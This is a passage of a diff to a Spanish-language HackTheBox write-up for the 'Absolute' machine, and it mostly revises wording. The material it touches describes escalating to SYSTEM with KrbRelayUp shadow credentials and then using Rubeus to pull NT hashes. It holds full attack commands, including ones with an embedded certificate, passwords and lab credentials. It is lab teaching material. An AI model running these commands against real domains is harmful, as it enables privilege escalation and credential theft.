sySUabrra4rHfC434uFGFK0WoOACvvUpnR55Bv8mIlSg0F2E1Txd9WF/SgOiXZfSlbRAPmHgK5Hf2jxvrXsV6ZX3ryNiyJTUy/TKA2sL+lSzLzqThmPZW561h4tjx9IHsZO4Q8Ra9Om+pwEC6WleNW1L8qjGqyo3N4wfB/JMrv/fTdJfGPbxFR6+qR44hUXvLE5uI1ITHsC5iYkoNBta1TnyM2kJ5kWNaqRUj6u4CpswGgwFI3PWu4JAFbZIVv4t2Tt4+dkSlpycGgqS6tzCH41aaPhJzriMJQfU/EjRCFiAQia4XPuazt5DJLozAdJs9VnTRcNwqtJSrkxFvKO2eXFQcKe5Fz8GTwkbO/QjphJC9yocuLaMFQ6mjmSBC9YB1ajvg6vPI8yHUHLRx0G2ncWE2spbm5vJEghHNUzC++oCVx+IUg7BYxeNNxJWGbzkKhaLr9zxUh+94ZaXPFdiwx00a1JoM00uvrMOk6Y5hXUgDCu/xD9Ghj6OufocQMPCdFfIuSCz6LNfy+1T+ESTr2pgDA7MB8wBwYFKw4DAhoEFP/2Wa26td4QNvYoAEsAKqQb8Aj5BBTMLXPc53du/ASCn05XC8bKMqJ3ugICB9A= /password:"nC38msY6DYWxnRBx" /domain:absolute.htb /dc:dc.absolute.htb /getcredentials /showPS /ptt
@@ -1292,9 +1387,11 @@ Después de tirar Winpeas para enumerar posibles vías de elevar mi privilegio, 
 
 ![img](/assets/img/post/Absolute/34.png)
 
-que consiste en crear una cuenta de máquina y aprovecharla para realizar un ataque Kerberos Relay en el controlador de dominio con la firma LDAP deshabilitada. Para que el ataque funcione el sistema no debe de estar parcheado desde octubre de 2022, y el LDAP debe no debe de estar firmado (por defecto en Windows).
+Este ataque consiste en crear una cuenta de máquina y aprovecharla para realizar un ataque Kerberos Relay en el controlador de dominio con la firma LDAP deshabilitada. Para que el ataque funcione el sistema no debe de estar parcheado desde octubre de 2022, y el LDAP debe no debe de estar firmado (por defecto en Windows).
 
-Normalmente con crackmapexec podemos enumerar si el LDAP esta firmado o no, pero en está maquina en concreto no funciona, vamos a suponer que esta sin firmar ya que es la opción por defecto.
+Podéis obtener más información de este ataque aquí [KrbRelay](https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html). Microsoft, lo parcheo hace poco tiempo y antes era una manera habitual de elevar privilegios en AD.
+
+Normalmente con crackmapexec podemos enumerar si LDAP esta firmado o no, pero en está maquina en concreto no funciona. Vamos a suponer que esta sin firmar, ya que es la opción por defecto.
 
 ```bash
 ❯ cme ldap 10.129.142.54 -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k  -M ldap-checker
@@ -1313,12 +1410,12 @@ HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion
 
 ```
 
-Como esta máquina fue lanzada en septiembre del 2022, es probable que no tenga el parche instalado. Así que vamos a clonar el repositorio de [KrbRelayUp](https://github.com/ShorSec/KrbRelayUp) para compilarlo en VS Code.
+No tenemos permisos para enumerar los parches instalados en el sistema, pero como esta máquina fue lanzada en septiembre del 2022, es probable que no lo tenga instalado. Así que vamos a clonar el repositorio de [KrbRelayUp](https://github.com/ShorSec/KrbRelayUp) para compilarlo en VS Code.
 
 ![img](/assets/img/post/Absolute/35.png)
 ![img](/assets/img/post/Absolute/38.png)
 
-Una vez compilado lo pasamos a la máquina víctima. Si lo ejecutamos nos dará un error.
+Una vez compilado pasamos el binario a la máquina víctima. Si lo ejecutamos nos dará un error.
 
 ![img](/assets/img/post/Absolute/36.png)
 
@@ -1350,9 +1447,9 @@ KrbRelayUp - Relaying you to SYSTEM
     ./KrbRelayUp.exe spawn -m shadowcred -d absolute.htb -dc dc.absolute.htb -ce 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 -cep kN9=qE6/eA2#
 ```
 
-El output de KrbRelayUp indica que ejecutó con éxito el ataque, y creó shadow credentials para la cuenta de `DC$`. Si ese es el caso, puedo tratar de utilizar este certificado con contraseña de una manera diferente. Voy a utilizar rubeus desde mi máquina Windows y ejecutarlo de la siguiente forma para obtener el hash NT:
+El output de KrbRelayUp indica que ejecutó con éxito el ataque, y creó shadow credentials para la cuenta de `DC$`. Ahora puedo tratar de utilizar este certificado con contraseña de una manera diferente. Voy a utilizar Rubeus desde mi máquina Windows, para ello he utilizado el siguiente comando.
 
->Es importante contar con un ticket para el usuario `m.lovegod`
+>Es importante contar con un ticket para el usuario **m.lovegod**
 {: .prompt-warning }
 
 ```
